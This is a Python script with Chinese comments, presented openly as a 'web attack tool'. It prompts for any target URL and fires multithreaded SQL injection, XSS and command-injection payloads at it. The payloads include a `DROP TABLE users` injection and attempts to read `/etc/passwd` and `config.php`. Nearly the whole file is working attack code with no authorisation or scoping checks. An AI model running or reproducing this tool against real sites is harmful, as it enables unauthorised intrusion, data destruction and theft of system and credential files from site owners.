#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Web攻击工具 - 自定义配置版本
支持自定义配置和Y/N确认执行
修复依赖问题，使用标准库替代
"""

import requests
import threading
import time
import socket
import urllib.parse
from datetime import datetime

class WebAttackTool:
    def __init__(self):
        self.is_running = False
        
        # 配置参数
        self.config = {
            'target_url': '',
            'attack_type': 'sql',
            'threads': 10,
            'timeout': 10,
            'payloads': []
        }
        
        # 统计信息
        self.stats = {
            'requests_sent': 0,
            'vulnerabilities_found': 0,
            'start_time': None
        }
        
        # 常见payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--",
            "' OR 'a'='a"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert('XSS')"
        ]
        
        self.command_payloads = [
            "; ls",
            "| dir",
            "& whoami",
            "; cat /etc/passwd",
            "| type config.php"
        ]
    
    def get_configuration(self):
        """获取用户自定义配置"""
        print("=" * 60)
        print("          Web攻击工具 - 自定义配置")
        print("=" * 60)
        
        # 目标URL配置
        while True:
            target_url = input("请输入目标URL (例如: http://example.com): ").strip()
            if self.validate_url(target_url):
                self.config['target_url'] = target_url
                break
            else:
                print("❌ URL格式不正确，请重新输入")
        
        # 攻击类型配置
        while True:
            attack_type = input("请输入攻击类型 (sql/xss/command) (默认sql): ").strip().lower()
            if attack_type in ['sql', 'xss', 'command']:
                self.config['attack_type'] = attack_type
                break
            elif not attack_type:
                self.config['attack_type'] = 'sql'
                break
            else:
                print("❌ 请输入 sql, xss 或 command")
        
        # 线程数配置
        while True:
            try:
                threads = int(input("请输入线程数 (默认10): ").strip() or "10")
                if 1 <= threads <= 50:
                    self.config['threads'] = threads
                    break
                else:
                    print("❌ 线程数必须在1-50之间")
            except ValueError:
                print("❌ 请输入有效的数字")
        
        # 超时时间配置
        while True:
            try:
                timeout = int(input("请输入超时时间(秒) (默认10): ").strip() or "10")
                if timeout > 0:
                    self.config['timeout'] = timeout
                    break
                else:
                    print("❌ 超时时间必须大于0")
            except ValueError:
                print("❌ 请输入有效的数字")
        
        # 自定义payload配置
        custom_payloads = input("是否使用自定义payload? (Y/N) (默认N): ").strip().upper()
        if custom_payloads == 'Y':
            print("请输入自定义payload，每行一个，空行结束:")
            while True:
                payload = input().strip()
                if payload:
                    self.config['payloads'].append(payload)
                else:
                    break
        else:
            # 使用默认payloads
            if self.config['attack_type'] == 'sql':
                self.config['payloads'] = self.sql_payloads
            elif self.config['attack_type'] == 'xss':
                self.config['payloads'] = self.xss_payloads
            elif self.config['attack_type'] == 'command':
                self.config['payloads'] = self.command_payloads
        
        return self.show_configuration()
    
    def validate_url(self, url):
        """验证URL格式"""
        try:
            result = urllib.parse.urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False
    
    def show_configuration(self):
        """显示配置信息并请求确认"""
        print("\n" + "=" * 60)
        print("          配置确认")
        print("=" * 60)
        print(f"目标URL: {self.config['target_url']}")
        print(f"攻击类型: {self.config['attack_type']}")
        print(f"线程数: {self.config['threads']}")
        print(f"超时时间: {self.config['timeout']}秒")
        print(f"Payload数量: {len(self.config['payloads'])}")
        print("=" * 60)
        
        # 请求用户确认
        while True:
            confirm = input("\n确认执行Web攻击? (Y/N): ").strip().upper()
            if confirm == 'Y':
                return True
            elif confirm == 'N':
                print("❌ 攻击已取消")
                return False
            else:
                print("❌ 请输入 Y 或 N")
    
    def start_attack(self):
        """开始Web攻击"""
        print("=" * 60)
        print("          Web攻击开始")
        print("=" * 60)
        print(f"目标URL: {self.config['target_url']}")
        print(f"攻击类型: {self.config['attack_type']}")
        print(f"线程数: {self.config['threads']}")
        print(f"超时时间: {self.config['timeout']}秒")
        print(f"Payload数量: {len(self.config['payloads'])}")
        print("=" * 60)
        
        self.is_running = True
        self.stats['start_time'] = time.time()
        self.stats['requests_sent'] = 0
        self.stats['vulnerabilities_found'] = 0
        
        try:
            # 根据攻击类型执行不同的攻击
            if self.config['attack_type'] == 'sql':
                self.sql_injection_attack()
            elif self.config['attack_type'] == 'xss':
                self.xss_attack()
            elif self.config['attack_type'] == 'command':
                self.command_injection_attack()
            
        except KeyboardInterrupt:
            print("\n[!] 用户中断攻击")
        except Exception as e:
            print(f"[-] 攻击错误: {e}")
        finally:
            self.stop_attack()
    
    def sql_injection_attack(self):
        """SQL注入攻击"""
        print("[+] 开始SQL注入攻击...")
        
        def test_sql_payload(payload):
            """测试SQL注入payload"""
            try:
                # 构造测试URL
                test_url = f"{self.config['target_url']}?id={payload}"
                
                # 发送请求
                response = requests.get(test_url, timeout=self.config['timeout'])
                self.stats['requests_sent'] += 1
                
                # 分析响应
                if self.detect_sql_vulnerability(response):
                    print(f"[漏洞] SQL注入成功: {payload}")
                    self.stats['vulnerabilities_found'] += 1
                    return True
                else:
                    print(f"[测试] {payload}")
                    return False
                    
            except Exception as e:
                print(f"[错误] {payload}: {e}")
                return False
        
        # 多线程测试
        threads = []
        for payload in self.config['payloads']:
            if not self.is_running:
                break
            
            t = threading.Thread(target=test_sql_payload, args=(payload,))
            threads.append(t)
            t.start()
            
            # 控制线程数量
            if len(threads) >= self.config['threads']:
                for t in threads:
                    t.join()
                threads = []
            
            time.sleep(0.5)  # 避免过于频繁
        
        # 等待剩余线程
        for t in threads:
            t.join()
    
    def xss_attack(self):
        """XSS攻击"""
        print("[+] 开始XSS攻击...")
        
        def test_xss_payload(payload):
            """测试XSS payload"""
            try:
                # 构造测试URL
                test_url = f"{self.config['target_url']}?search={payload}"
                
                # 发送请求
                response = requests.get(test_url, timeout=self.config['timeout'])
                self.stats['requests_sent'] += 1
                
                # 分析响应
                if self.detect_xss_vulnerability(response, payload):
                    print(f"[漏洞] XSS成功: {payload}")
                    self.stats['vulnerabilities_found'] += 1
                    return True
                else:
                    print(f"[测试] {payload}")
                    return False
                    
            except Exception as e:
                print(f"[错误] {payload}: {e}")
                return False
        
        # 多线程测试
        threads = []
        for payload in self.config['payloads']:
            if not self.is_running:
                break
            
            t = threading.Thread(target=test_xss_payload, args=(payload,))
            threads.append(t)
            t.start()
            
            # 控制线程数量
            if len(threads) >= self.config['threads']:
                for t in threads:
                    t.join()
                threads = []
            
            time.sleep(0.5)
        
        # 等待剩余线程
        for t in threads:
            t.join()
    
    def command_injection_attack(self):
        """命令注入攻击"""
        print("[+] 开始命令注入攻击...")
        
        def test_command_payload(payload):
            """测试命令注入payload"""
            try:
                # 构造测试URL
                test_url = f"{self.config['target_url']}?cmd={payload}"
                
                # 发送请求
                response = requests.get(test_url, timeout=self.config['timeout'])
                self.stats['requests_sent'] += 1
                
                # 分析响应
                if self.detect_command_vulnerability(response):
                    print(f"[漏洞] 命令注入成功: {payload}")
                    self.stats['vulnerabilities_found'] += 1
                    return True
                else:
                    print(f"[测试] {payload}")
                    return False
                    
            except Exception as e:
                print(f"[错误] {payload}: {e}")
                return False
        
        # 多线程测试
        threads = []
        for payload in self.config['payloads']:
            if not self.is_running:
                break
            
            t = threading.Thread(target=test_command_payload, args=(payload,))
            threads.append(t)
            t.start()
            
            # 控制线程数量
            if len(threads) >= self.config['threads']:
                for t in threads:
                    t.join()
                threads = []
            
            time.sleep(0.5)
        
        # 等待剩余线程
        for t in threads:
            t.join()
    
    def detect_sql_vulnerability(self, response):
        """检测SQL注入漏洞"""
        # 简单的SQL错误检测
        sql_errors = [
            'sql syntax', 'mysql_fetch', 'ORA-', 'Microsoft OLE DB',
            'ODBC Driver', 'PostgreSQL', 'SQLServer', 'MySQL',
            'Warning: mysql', 'Unclosed quotation mark'
        ]
        
        content = response.text.lower()
        for error in sql_errors:
            if error in content:
                return True
        
        # 检查响应时间差异
        return False
    
    def detect_xss_vulnerability(self, response, payload):
        """检测XSS漏洞"""
        # 检查payload是否在响应中未转义
        content = response.text
        if payload in content:
            # 检查是否被HTML转义
            escaped_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
            if escaped_payload not in content:
                return True
        
        return False
    
    def detect_command_vulnerability(self, response):
        """检测命令注入漏洞"""
        # 检查响应中是否包含命令执行结果
        command_outputs = [
            'root:', 'etc/passwd', 'Directory of', 'total',
            'drwx', '-rw-', 'index.php', 'config.php'
        ]
        
        content = response.text.lower()
        for output in command_outputs:
            if output in content:
                return True
        
        return False
    
    def stop_attack(self):
        """停止攻击"""
        if self.is_running:
            print("\n[+] 停止Web攻击...")
            self.is_running = False
            
            # 显示统计信息
            elapsed = time.time() - self.stats['start_time']
            print(f"\n[+] 攻击统计:")
            print(f"    - 总运行时间: {int(elapsed)}秒")
            print(f"    - 发送请求数: {self.stats['requests_sent']}")
            print(f"    - 发现漏洞数: {self.stats['vulnerabilities_found']}")
            print(f"    - 成功率: {self.stats['vulnerabilities_found'] / max(1, self.stats['requests_sent']) * 100:.1f}%")

def main():
    """主函数"""
    try:
        tool = WebAttackTool()
        
        # 获取配置并确认
        if tool.get_configuration():
            tool.start_attack()
        
    except KeyboardInterrupt:
        print("\n[!] 程序被用户中断")
    except Exception as e:
        print(f"[-] 程序错误: {e}")

if __name__ == "__main__":
    main()